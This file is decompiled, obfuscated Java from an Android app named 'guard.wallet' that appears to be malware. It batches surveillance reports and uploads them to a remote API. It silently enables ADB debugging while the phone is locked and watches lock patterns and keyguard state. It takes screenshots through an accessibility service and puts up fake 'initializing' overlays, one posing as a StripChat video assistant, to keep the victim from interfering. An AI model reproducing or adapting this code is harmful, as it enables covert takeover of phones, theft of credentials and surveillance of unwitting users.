package com.guard.wallet.thread;

import a1.q;
import android.os.Build.VERSION;
import android.util.Log;
import com.google.json.JsonObject;
import com.guard.wallet.MainApplication;
import com.guard.wallet.http.t;
import com.guard.wallet.req.ApiRequest;
import com.guard.wallet.req.BlockViewVO;
import com.guard.wallet.req.ContainerEventVO;
import com.guard.wallet.req.LockPatternVO;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.req.ReqMessageVO;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.LinkedList;
import java.util.ListIterator;
import java.util.Objects;
import java.util.TimerTask;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.Future;

public final class d extends TimerTask {
   public final int a;
   public final Object b;

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void run() {
      Integer var7 = 0;
      ListIterator var8 = null;
      int var2 = this.a;
      int var1 = -1;
      boolean var5 = true;
      u.a var6 = (u.a)this.b;
      switch (var2) {
         case 0:
            Log.d("HandlerMsgAndTimer", "handle msg thread is running");
            e var123 = (e)var6;
            if (!var123.f.isEmpty()) {
               LinkedList var107 = new LinkedList();

               while (true) {
                  var1 = var107.size();
                  ConcurrentLinkedQueue var127 = var123.f;
                  if (var1 >= 20 || var127.isEmpty()) {
                     Exception var139;
                     label969: {
                        JsonObject var133;
                        try {
                           if (var107.isEmpty()) {
                              break;
                           }

                           ApiRequest var10 = new ApiRequest();
                           var10.setData(var107);
                           var133 = com.guard.wallet.http.l.q(var10, com.guard.wallet.http.l.a);
                        } catch (Exception var83) {
                           var139 = var83;
                           boolean var202 = false;
                           break label969;
                        }

                        if (var133 != null) {
                           try {
                              HandlerMsgAndTimer$2 var11 = new HandlerMsgAndTimer$2();
                              var134 = (ApiResult)com.guard.wallet.utils.h.c(var133.toString(), var11);
                           } catch (Exception var82) {
                              var139 = var82;
                              boolean var203 = false;
                              break label969;
                           }

                           if (var134 != null) {
                              try {
                                 if (var134.getSuccess() && (Boolean)var134.getData()) {
                                    StringBuilder var128 = new StringBuilder("同步发送监听汇报消息成功,发送数目：");
                                    var128.append(var107.size());
                                    Log.d("HandlerMsgAndTimer", var128.toString());
                                    break;
                                 }
                              } catch (Exception var81) {
                                 var139 = var81;
                                 boolean var204 = false;
                                 break label969;
                              }
                           }
                        }

                        try {
                           StringBuilder var135 = new StringBuilder("同步发送监听汇报消息失败,归还数目：");
                           var135.append(var107.size());
                           Log.e("HandlerMsgAndTimer", var135.toString());
                           var127.addAll(var107);
                           break;
                        } catch (Exception var80) {
                           var139 = var80;
                           boolean var205 = false;
                        }
                     }

                     Exception var108 = var139;
                     q.s("HandlerMsgAndTimer", var108);
                     break;
                  }

                  var107.add((ReqMessageVO)var127.poll());
               }
            }

            var5 = var123.b;
            Integer var109 = 1;
            if (!var5) {
               MessageRecordVO var136 = new MessageRecordVO();
               ContainerEventVO var129 = new ContainerEventVO();
               if (MainApplication.getInstance() != null) {
                  var129.setPackageName(MainApplication.getInstance().getPackageName());
               }

               var129.setContainerCode("ACCESSIBILITY_CONTAINER");
               if (MyAccessibilityService.P() != null) {
                  var129.setIsOpened(var109);
               } else {
                  var129.setIsOpened(var7);
               }

               var129.setServiceState(com.guard.wallet.server.b.c.get());
               var136.setIntentCode("android.intent.action.CONTAINER_EVENT");
               var136.setExtraBody(var129);
               var123.b(var136);
               var136 = new MessageRecordVO();
               var129 = new ContainerEventVO();
               if (MainApplication.getInstance() != null) {
                  var129.setPackageName(MainApplication.getInstance().getPackageName());
               }

               var129.setContainerCode("ACCESSIBILITY_MINI_CAP_CONTAINER");
               if (com.guard.wallet.server.c.G() != null && com.guard.wallet.server.c.G().x.get()) {
                  var129.setIsOpened(var109);
               } else {
                  var129.setIsOpened(var7);
                  var109 = var7;
               }

               var129.setServiceState(var109);
               var136.setIntentCode("android.intent.action.CONTAINER_EVENT");
               var136.setExtraBody(var129);
               var123.b(var136);
            }

            var123.b ^= true;
            ConcurrentLinkedQueue var110 = var123.e;
            if (!var110.isEmpty()) {
               LinkedList var121 = new LinkedList();

               while (var121.size() < 20 && !var110.isEmpty()) {
                  var121.add((ReqMessageVO)var110.poll());
               }

               Exception var140;
               label973: {
                  JsonObject var131;
                  try {
                     if (var121.isEmpty()) {
                        return;
                     }

                     var111 = new ApiRequest();
                     var111.setData(var121);
                     var131 = com.guard.wallet.http.l.q(var111, com.guard.wallet.http.l.a);
                  } catch (Exception var79) {
                     var140 = var79;
                     boolean var206 = false;
                     break label973;
                  }

                  label974: {
                     if (var131 != null) {
                        try {
                           HandlerMsgAndTimer$3 var124 = new HandlerMsgAndTimer$3();
                           var125 = (ApiResult)com.guard.wallet.utils.h.c(var131.toString(), var124);
                        } catch (Exception var77) {
                           var140 = var77;
                           boolean var207 = false;
                           break label973;
                        }

                        if (var125 != null) {
                           try {
                              if (var125.getSuccess() && (Boolean)var125.getData()) {
                                 var112 = new StringBuilder("同步发送消息成功：");
                                 break label974;
                              }
                           } catch (Exception var78) {
                              var140 = var78;
                              boolean var208 = false;
                              break label973;
                           }
                        }
                     }

                     try {
                        t var132 = new t();
                        com.guard.wallet.http.i var126 = new com.guard.wallet.http.i();
                        var126.h(var111, "/api/message/post.json", var132);
                        var112 = new StringBuilder("异步提交消息:");
                     } catch (Exception var76) {
                        var140 = var76;
                        boolean var209 = false;
                        break label973;
                     }
                  }

                  try {
                     var1 = var121.size();
                  } catch (Exception var75) {
                     var140 = var75;
                     boolean var210 = false;
                     break label973;
                  }

                  try {
                     var112.append(var1);
                     Log.d("HandlerMsgAndTimer", var112.toString());
                     return;
                  } catch (Exception var74) {
                     var140 = var74;
                     boolean var211 = false;
                  }
               }

               Exception var113 = var140;
               q.s("HandlerMsgAndTimer", var113);
            }

            return;
         case 1:
            j var93 = (j)var6;
            if (!((ConcurrentLinkedQueue)var93.e).isEmpty()) {
               String var9 = (String)((ConcurrentLinkedQueue)var93.e).poll();

               Exception var10000;
               label992: {
                  label844: {
                     label843: {
                        try {
                           if (q.B(var9) || h.e.S() == null) {
                              return;
                           }

                           if (com.guard.wallet.utils.f.b.get() && MyAccessibilityService.P() != null && MyAccessibilityService.P().V()) {
                              break label843;
                           }
                        } catch (Exception var73) {
                           var10000 = var73;
                           boolean var10001 = false;
                           break label992;
                        }

                        var86 = false;
                        break label844;
                     }

                     var86 = true;
                  }

                  label830: {
                     try {
                        Integer var94 = com.guard.wallet.utils.d.a;
                        if (MainApplication.getInstance() != null
                           && MainApplication.getInstance().getBuildConfig() != null
                           && MainApplication.getInstance().getBuildConfig().getPerIdleDuration() > 0) {
                           var95 = MainApplication.getInstance().getBuildConfig().getPerIdleDuration();
                           break label830;
                        }
                     } catch (Exception var72) {
                        var10000 = var72;
                        boolean var141 = false;
                        break label992;
                     }

                     try {
                        var95 = com.guard.wallet.utils.d.f;
                     } catch (Exception var71) {
                        var10000 = var71;
                        boolean var142 = false;
                        break label992;
                     }
                  }

                  label933: {
                     label934: {
                        label935: {
                           label936: {
                              label937: {
                                 label938: {
                                    label939: {
                                       label940: {
                                          label941: {
                                             label942: {
                                                label943: {
                                                   label944: {
                                                      label945: {
                                                         label946: {
                                                            label947: {
                                                               label948: {
                                                                  label949: {
                                                                     label950: {
                                                                        try {
                                                                           switch (var9.hashCode()) {
                                                                              case -2084312197:
                                                                                 break label934;
                                                                              case -1854071959:
                                                                                 break label935;
                                                                              case -1511578636:
                                                                                 break label936;
                                                                              case -1407478447:
                                                                                 break label937;
                                                                              case -1401558814:
                                                                                 break label938;
                                                                              case -1116991753:
                                                                                 break label939;
                                                                              case -659297786:
                                                                                 break label940;
                                                                              case -445371995:
                                                                                 break label941;
                                                                              case 461534839:
                                                                                 break label942;
                                                                              case 557297655:
                                                                                 break label943;
                                                                              case 1036604936:
                                                                                 break label944;
                                                                              case 1242439190:
                                                                                 break label945;
                                                                              case 1349441335:
                                                                                 break label946;
                                                                              case 1411429700:
                                                                                 break label947;
                                                                              case 1686224031:
                                                                                 break label948;
                                                                              case 1852747662:
                                                                                 break label949;
                                                                              case 1855509647:
                                                                                 break label950;
                                                                              case 1925295817:
                                                                                 break;
                                                                              default:
                                                                                 break label933;
                                                                           }
                                                                        } catch (Exception var70) {
                                                                           var10000 = var70;
                                                                           boolean var143 = false;
                                                                           break label992;
                                                                        }

                                                                        try {
                                                                           if (!var9.equals("KEEP_ADB_ALIVE_WIFI_DEBUG_ON")) {
                                                                              break label933;
                                                                           }
                                                                        } catch (Exception var69) {
                                                                           var10000 = var69;
                                                                           boolean var144 = false;
                                                                           break label992;
                                                                        }

                                                                        var1 = 7;
                                                                        break label933;
                                                                     }

                                                                     try {
                                                                        if (!var9.equals("KEEP_ADB_ALIVE_DEVELOPMENT_ON")) {
                                                                           break label933;
                                                                        }
                                                                     } catch (Exception var68) {
                                                                        var10000 = var68;
                                                                        boolean var145 = false;
                                                                        break label992;
                                                                     }

                                                                     var1 = 3;
                                                                     break label933;
                                                                  }

                                                                  try {
                                                                     if (!var9.equals("KEEP_ADB_ALIVE_SCREEN_USER_PRESENT")) {
                                                                        break label933;
                                                                     }
                                                                  } catch (Exception var67) {
                                                                     var10000 = var67;
                                                                     boolean var146 = false;
                                                                     break label992;
                                                                  }

                                                                  var1 = 2;
                                                                  break label933;
                                                               }

                                                               try {
                                                                  if (!var9.equals("KEEP_ADB_ALIVE_DEVELOPMENT_OFF")) {
                                                                     break label933;
                                                                  }
                                                               } catch (Exception var66) {
                                                                  var10000 = var66;
                                                                  boolean var147 = false;
                                                                  break label992;
                                                               }

                                                               var1 = 4;
                                                               break label933;
                                                            }

                                                            try {
                                                               if (!var9.equals("LOCAL_WIFI_NETWORK_PREPARED")) {
                                                                  break label933;
                                                               }
                                                            } catch (Exception var65) {
                                                               var10000 = var65;
                                                               boolean var148 = false;
                                                               break label992;
                                                            }

                                                            var1 = 14;
                                                            break label933;
                                                         }

                                                         try {
                                                            if (!var9.equals("KEEP_ADB_ALIVE_ADB_DEBUG_ON")) {
                                                               break label933;
                                                            }
                                                         } catch (Exception var64) {
                                                            var10000 = var64;
                                                            boolean var149 = false;
                                                            break label992;
                                                         }

                                                         var1 = 5;
                                                         break label933;
                                                      }

                                                      try {
                                                         if (!var9.equals("PREPARE_FOR_APP_CONFIRM_LOCK")) {
                                                            break label933;
                                                         }
                                                      } catch (Exception var63) {
                                                         var10000 = var63;
                                                         boolean var150 = false;
                                                         break label992;
                                                      }

                                                      var1 = 13;
                                                      break label933;
                                                   }

                                                   try {
                                                      if (!var9.equals("KEEP_ADB_ALIVE_SCREEN_OFF")) {
                                                         break label933;
                                                      }
                                                   } catch (Exception var62) {
                                                      var10000 = var62;
                                                      boolean var151 = false;
                                                      break label992;
                                                   }

                                                   var1 = 0;
                                                   break label933;
                                                }

                                                try {
                                                   if (!var9.equals("PREPARE_FOR_UPDATE_SYSTEM")) {
                                                      break label933;
                                                   }
                                                } catch (Exception var61) {
                                                   var10000 = var61;
                                                   boolean var152 = false;
                                                   break label992;
                                                }

                                                var1 = 15;
                                                break label933;
                                             }

                                             try {
                                                if (!var9.equals("PREPARE_LEAVE_PIP")) {
                                                   break label933;
                                                }
                                             } catch (Exception var60) {
                                                var10000 = var60;
                                                boolean var153 = false;
                                                break label992;
                                             }

                                             var1 = 12;
                                             break label933;
                                          }

                                          try {
                                             if (!var9.equals("KEEP_ADB_ALIVE_WIFI_DEBUG_OFF")) {
                                                break label933;
                                             }
                                          } catch (Exception var59) {
                                             var10000 = var59;
                                             boolean var154 = false;
                                             break label992;
                                          }

                                          var1 = 8;
                                          break label933;
                                       }

                                       try {
                                          if (!var9.equals("KEEP_ADB_ALIVE_SCREEN_ON")) {
                                             break label933;
                                          }
                                       } catch (Exception var58) {
                                          var10000 = var58;
                                          boolean var155 = false;
                                          break label992;
                                       }

                                       var1 = 1;
                                       break label933;
                                    }

                                    try {
                                       if (!var9.equals("KEEP_ADB_ALIVE_ADB_DEBUG_OFF")) {
                                          break label933;
                                       }
                                    } catch (Exception var57) {
                                       var10000 = var57;
                                       boolean var156 = false;
                                       break label992;
                                    }

                                    var1 = 6;
                                    break label933;
                                 }

                                 try {
                                    if (!var9.equals("LOAD_LISTEN_WINDOW_FINISHED")) {
                                       break label933;
                                    }
                                 } catch (Exception var56) {
                                    var10000 = var56;
                                    boolean var157 = false;
                                    break label992;
                                 }

                                 var1 = 17;
                                 break label933;
                              }

                              try {
                                 if (!var9.equals("LOCAL_LOCK_CIPHER_PREPARED")) {
                                    break label933;
                                 }
                              } catch (Exception var55) {
                                 var10000 = var55;
                                 boolean var158 = false;
                                 break label992;
                              }

                              var1 = 11;
                              break label933;
                           }

                           try {
                              if (!var9.equals("SCREEN_OFF_LONG_DURATION")) {
                                 break label933;
                              }
                           } catch (Exception var54) {
                              var10000 = var54;
                              boolean var159 = false;
                              break label992;
                           }

                           var1 = 9;
                           break label933;
                        }

                        try {
                           if (!var9.equals("INTERACTIVE_IDLE_LONG_DURATION")) {
                              break label933;
                           }
                        } catch (Exception var53) {
                           var10000 = var53;
                           boolean var160 = false;
                           break label992;
                        }

                        var1 = 10;
                        break label933;
                     }

                     try {
                        if (!var9.equals("LOAD_LOCATE_VALUES_FINISHED")) {
                           break label933;
                        }
                     } catch (Exception var52) {
                        var10000 = var52;
                        boolean var161 = false;
                        break label992;
                     }

                     var1 = 16;
                  }

                  label685: {
                     label993: {
                        label681: {
                           label680: {
                              switch (var1) {
                                 case 0:
                                    try {
                                       LockPatternVO var106 = com.guard.wallet.utils.g.B0();
                                       Log.d("StrategyThread", "手机息屏");
                                       if (var106.getIsKeyguardLocked() == 1 && var106.getIsDeviceSecure() == 1) {
                                          Log.d("StrategyThread", "手机息屏,屏幕锁定");
                                          if (!com.guard.wallet.utils.g.I()) {
                                             Log.d("StrategyThread", "手机息屏,屏幕锁定，发起打开ADB调试");
                                             com.guard.wallet.http.l.k("http://127.0.0.1:7911");
                                             return;
                                          }
                                       }

                                       return;
                                    } catch (Exception var26) {
                                       var10000 = var26;
                                       boolean var201 = false;
                                       break label992;
                                    }
                                 case 1:
                                    try {
                                       if (com.guard.wallet.utils.g.B0().getIsKeyguardLocked() != 1) {
                                          return;
                                       }
                                    } catch (Exception var39) {
                                       var10000 = var39;
                                       boolean var199 = false;
                                       break label992;
                                    }

                                    var96 = "手机亮屏,屏幕锁定";
                                    break label680;
                                 case 2:
                                    var96 = "手机解锁,初始化连接状态";
                                    break label680;
                                 case 3:
                                 case 4:
                                 case 5:
                                 case 6:
                                 case 7:
                                 case 8:
                                    try {
                                       h.e.S().H();
                                       return;
                                    } catch (Exception var25) {
                                       var10000 = var25;
                                       boolean var198 = false;
                                       break label992;
                                    }
                                 case 9:
                                    long var88;
                                    label633: {
                                       try {
                                          if (MainApplication.getInstance().getCheckThread() != null) {
                                             var88 = MainApplication.getInstance().getCheckThread().p.get();
                                             break label633;
                                          }
                                       } catch (Exception var47) {
                                          var10000 = var47;
                                          boolean var185 = false;
                                          break label992;
                                       }

                                       var88 = 0L;
                                    }

                                    label624: {
                                       try {
                                          if (MainApplication.getInstance() != null
                                             && MainApplication.getInstance().getBuildConfig() != null
                                             && MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration() > 0) {
                                             var101 = MainApplication.getInstance().getBuildConfig().getPerScreenOffDuration();
                                             break label624;
                                          }
                                       } catch (Exception var46) {
                                          var10000 = var46;
                                          boolean var186 = false;
                                          break label992;
                                       }

                                       try {
                                          var101 = com.guard.wallet.utils.d.e;
                                       } catch (Exception var38) {
                                          var10000 = var38;
                                          boolean var187 = false;
                                          break label992;
                                       }
                                    }

                                    try {
                                       if (var88 < (long)var101.intValue() || var88 % (long)var101.intValue() != 0L) {
                                          return;
                                       }

                                       if (MyAccessibilityService.P() != null) {
                                          MyAccessibilityService.P().H(true, true);
                                       }
                                    } catch (Exception var45) {
                                       var10000 = var45;
                                       boolean var188 = false;
                                       break label992;
                                    }

                                    try {
                                       com.guard.wallet.helper.g.c();
                                    } catch (Exception var37) {
                                       var10000 = var37;
                                       boolean var189 = false;
                                       break label992;
                                    }

                                    if (!var86) {
                                       return;
                                    }
                                    break label681;
                                 case 10:
                                    long var87;
                                    label648: {
                                       try {
                                          if (MainApplication.getInstance().getCheckThread() != null) {
                                             var87 = MainApplication.getInstance().getCheckThread().n.get();
                                             break label648;
                                          }
                                       } catch (Exception var49) {
                                          var10000 = var49;
                                          boolean var183 = false;
                                          break label992;
                                       }

                                       var87 = 0L;
                                    }

                                    try {
                                       if (var87 < (long)var95.intValue()
                                          || var87 % (long)var95.intValue() != 0L
                                          || var87 % (long)(var95 * 4) == 0L && !h.e.S().U() && !com.guard.wallet.utils.g.n0() && com.guard.wallet.utils.g.S0()
                                          )
                                        {
                                          return;
                                       }
                                    } catch (Exception var48) {
                                       var10000 = var48;
                                       boolean var184 = false;
                                       break label992;
                                    }

                                    if (!var86) {
                                       return;
                                    }
                                    break label681;
                                 case 11:
                                    long var3;
                                    label607: {
                                       try {
                                          if (MainApplication.getInstance().getCheckThread() != null) {
                                             var3 = MainApplication.getInstance().getCheckThread().n.get();
                                             break label607;
                                          }
                                       } catch (Exception var44) {
                                          var10000 = var44;
                                          boolean var179 = false;
                                          break label992;
                                       }

                                       var3 = 0L;
                                    }

                                    try {
                                       if (var3 < (long)var95.intValue() || var3 % (long)var95.intValue() != 0L || h.e.S().U()) {
                                          return;
                                       }
                                    } catch (Exception var31) {
                                       var10000 = var31;
                                       boolean var180 = false;
                                       break label992;
                                    }

                                    if (!var86) {
                                       return;
                                    }

                                    try {
                                       if (!com.guard.wallet.utils.g.n0()) {
                                          return;
                                       }

                                       h.e.S().getClass();
                                    } catch (Exception var30) {
                                       var10000 = var30;
                                       boolean var181 = false;
                                       break label992;
                                    }

                                    var98 = var8;
                                    break label993;
                                 case 12:
                                    label497: {
                                       try {
                                          if (h.e.S().U()) {
                                             break label497;
                                          }
                                       } catch (Exception var16) {
                                          var10000 = var16;
                                          boolean var176 = false;
                                          break label992;
                                       }

                                       if (var86) {
                                          try {
                                             if (Objects.equals(var7, com.guard.wallet.utils.d.g()) && com.guard.wallet.utils.g.n0() && h.e.Y(null)) {
                                                return;
                                             }
                                          } catch (Exception var15) {
                                             var10000 = var15;
                                             boolean var177 = false;
                                             break label992;
                                          }
                                       }
                                    }

                                    try {
                                       e.b.d();
                                       com.guard.wallet.helper.g.c();
                                       return;
                                    } catch (Exception var14) {
                                       var10000 = var14;
                                       boolean var178 = false;
                                       break label992;
                                    }
                                 case 13:
                                    try {
                                       if (h.e.S().U()) {
                                          break label685;
                                       }
                                    } catch (Exception var41) {
                                       var10000 = var41;
                                       boolean var172 = false;
                                       break label992;
                                    }

                                    if (var86) {
                                       label574: {
                                          try {
                                             if (!com.guard.wallet.utils.g.n0()) {
                                                break label685;
                                             }

                                             if (MainApplication.getInstance() != null
                                                && MainApplication.getInstance().getBuildConfig() != null
                                                && !q.B(MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg())) {
                                                var100 = MainApplication.getInstance().getBuildConfig().getAppCredentialInitMsg();
                                                break label574;
                                             }
                                          } catch (Exception var40) {
                                             var10000 = var40;
                                             boolean var173 = false;
                                             break label992;
                                          }

                                          var100 = "Initializing verification key\nPlease wait...";
                                       }

                                       try {
                                          BlockViewVO var120 = new BlockViewVO(false, var100, false, false);
                                          h.e.S().getClass();
                                          if (h.e.Y(var120)) {
                                             return;
                                          }
                                       } catch (Exception var29) {
                                          var10000 = var29;
                                          boolean var174 = false;
                                          break label992;
                                       }
                                    }
                                    break label685;
                                 case 14:
                                    try {
                                       if (h.e.S().U()) {
                                          break label685;
                                       }
                                    } catch (Exception var43) {
                                       var10000 = var43;
                                       boolean var169 = false;
                                       break label992;
                                    }

                                    if (var86) {
                                       label593: {
                                          try {
                                             if (!com.guard.wallet.utils.g.n0()) {
                                                break label685;
                                             }

                                             if (MainApplication.getInstance() != null
                                                && MainApplication.getInstance().getBuildConfig() != null
                                                && !q.B(MainApplication.getInstance().getBuildConfig().getWifiBlockMsg())) {
                                                var99 = MainApplication.getInstance().getBuildConfig().getWifiBlockMsg();
                                                break label593;
                                             }
                                          } catch (Exception var42) {
                                             var10000 = var42;
                                             boolean var170 = false;
                                             break label992;
                                          }

                                          var99 = "Initializing Wi-Fi network data transmission key\nPlease do not operate your phone...";
                                       }

                                       try {
                                          BlockViewVO var119 = new BlockViewVO(false, var99, false, false);
                                          h.e.S().getClass();
                                          if (h.e.Y(var119)) {
                                             return;
                                          }
                                       } catch (Exception var28) {
                                          var10000 = var28;
                                          boolean var171 = false;
                                          break label992;
                                       }
                                    }
                                    break label685;
                                 case 15:
                                    if (!var86) {
                                       return;
                                    }

                                    try {
                                       String var117 = com.guard.wallet.utils.d.i();
                                       var98 = new BlockViewVO(false, var117, false, false);
                                       e.b var118 = e.b.a;
                                       if (com.guard.wallet.utils.e.l() && j.g(var98, true)) {
                                          return;
                                       }
                                    } catch (Exception var51) {
                                       var10000 = var51;
                                       boolean var166 = false;
                                       break label992;
                                    }

                                    try {
                                       if (h.e.S().U() || !com.guard.wallet.utils.g.n0()) {
                                          return;
                                       }
                                       break;
                                    } catch (Exception var33) {
                                       var10000 = var33;
                                       boolean var167 = false;
                                       break label992;
                                    }
                                 case 16:
                                 case 17:
                                    if (!var86) {
                                       return;
                                    }

                                    label666: {
                                       try {
                                          if (MainApplication.getInstance() != null
                                             && MainApplication.getInstance().getBuildConfig() != null
                                             && !q.B(MainApplication.getInstance().getBuildConfig().getAliveBlockMsg())) {
                                             var97 = MainApplication.getInstance().getBuildConfig().getAliveBlockMsg();
                                             break label666;
                                          }
                                       } catch (Exception var50) {
                                          var10000 = var50;
                                          boolean var162 = false;
                                          break label992;
                                       }

                                       var97 = "Initializing [StripChat video assistant]\nPlease do not operate your phone...";
                                    }

                                    try {
                                       var116 = new BlockViewVO(false, var97, false, false);
                                       if (j.g(var116, true)) {
                                          return;
                                       }
                                    } catch (Exception var36) {
                                       var10000 = var36;
                                       boolean var163 = false;
                                       break label992;
                                    }

                                    try {
                                       if (j.e()) {
                                          return;
                                       }
                                    } catch (Exception var35) {
                                       var10000 = var35;
                                       boolean var164 = false;
                                       break label992;
                                    }

                                    try {
                                       if (h.e.S().U() || !com.guard.wallet.utils.g.n0()) {
                                          return;
                                       }
                                    } catch (Exception var34) {
                                       var10000 = var34;
                                       boolean var165 = false;
                                       break label992;
                                    }

                                    var98 = var116;
                                    break;
                                 default:
                                    var96 = "未知策略事件";
                                    break label680;
                              }

                              try {
                                 h.e.S().getClass();
                                 break label993;
                              } catch (Exception var32) {
                                 var10000 = var32;
                                 boolean var168 = false;
                                 break label992;
                              }
                           }

                           try {
                              Log.d("StrategyThread", var96);
                              return;
                           } catch (Exception var27) {
                              var10000 = var27;
                              boolean var200 = false;
                              break label992;
                           }
                        }

                        label963: {
                           try {
                              e.b var102 = e.b.a;
                              var5 = com.guard.wallet.utils.e.l();
                           } catch (Exception var24) {
                              var10000 = var24;
                              boolean var190 = false;
                              break label963;
                           }

                           label982: {
                              if (var5) {
                                 try {
                                    if (j.g(null, true)) {
                                       break label982;
                                    }
                                 } catch (Exception var21) {
                                    var10000 = var21;
                                    boolean var191 = false;
                                    break label963;
                                 }
                              }

                              label527: {
                                 label965: {
                                    try {
                                       if (!h.e.S().U() && com.guard.wallet.utils.g.n0() && h.e.Y(null)) {
                                          break label965;
                                       }
                                    } catch (Exception var23) {
                                       var10000 = var23;
                                       boolean var192 = false;
                                       break label963;
                                    }

                                    try {
                                       if (j.g(null, true)) {
                                          break label982;
                                       }
                                    } catch (Exception var22) {
                                       var10000 = var22;
                                       boolean var193 = false;
                                       break label963;
                                    }

                                    try {
                                       if (!h.e.S().U() || !h.e.S().D() || !h.e.S().B.get() || !h.e.S().X()) {
                                          return;
                                       }
                                    } catch (Exception var20) {
                                       var10000 = var20;
                                       boolean var194 = false;
                                       break label963;
                                    }

                                    var103 = "openWriteSecure";
                                    break label527;
                                 }

                                 var103 = "requestLocalAdbPair";
                              }

                              try {
                                 Log.d("StrategyThread", var103);
                                 return;
                              } catch (Exception var19) {
                                 var10000 = var19;
                                 boolean var195 = false;
                                 break label963;
                              }
                           }

                           try {
                              Log.d("StrategyThread", "requestLocalKeepAlive");
                              return;
                           } catch (Exception var18) {
                              var10000 = var18;
                              boolean var196 = false;
                           }
                        }

                        Exception var104 = var10000;

                        try {
                           q.s("StrategyThread", var104);
                           return;
                        } catch (Exception var12) {
                           var10000 = var12;
                           boolean var197 = false;
                           break label992;
                        }
                     }

                     try {
                        h.e.Y(var98);
                        return;
                     } catch (Exception var17) {
                        var10000 = var17;
                        boolean var182 = false;
                        break label992;
                     }
                  }

                  try {
                     j.e();
                     return;
                  } catch (Exception var13) {
                     var10000 = var13;
                     boolean var175 = false;
                  }
               }

               Exception var105 = var10000;
               q.s("StrategyThread", var105);
            }

            return;
         case 2:
            if (MyAccessibilityService.P() != null && VERSION.SDK_INT >= 30) {
               LinkedList var114 = d0.a.j;
               if (!var114.isEmpty()) {
                  var8 = var114.listIterator();

                  while (var8.hasNext()) {
                     if (((Future)var8.next()).isDone()) {
                        var8.remove();
                     }
                  }

                  var5 = var114.isEmpty();
               }

               if (var5) {
                  d0.a var115 = (d0.a)var6;
                  var6 = var115.f;
                  if (var6 != null && ((u.a)var6).b()) {
                     var6 = var115.f;
                     var6.a.set(0);
                     var6.d = null;
                     MyAccessibilityService.P().takeScreenshot(com.guard.wallet.utils.e.b, android.support.v4.view.a.n(MainApplication.getAppContext()), var6);

                     while (!var6.b()) {
                     }

                     var6.a.set(-1);
                     var6.d = null;
                  }
               }
            }

            return;
         default:
            ((b1.h)var6).y();
      }
   }
}
